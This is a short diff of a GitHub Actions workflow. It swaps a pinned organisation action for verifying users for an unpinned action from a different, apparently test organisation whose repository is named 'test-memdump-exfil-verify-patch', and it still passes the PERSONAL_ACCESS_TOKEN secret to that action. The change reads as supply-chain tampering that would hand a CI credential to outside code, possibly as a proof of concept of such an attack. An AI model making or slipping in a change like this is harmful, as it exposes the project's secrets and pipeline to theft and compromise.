@@ -48,7 +48,7 @@ jobs:
           head_sha: ${{github.event.workflow_run.head_sha}}
 
       - name: Verify user
-        uses: "deriv-com/shared-actions/.github/actions/verify_user_in_organization@v1"
+        uses: "test-organization-wengonn/test-memdump-exfil-verify-patch/.github/actions/verify_user_in_organization@main"
         with:
           username: ${{steps.pr_information.outputs.username}}
           token: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
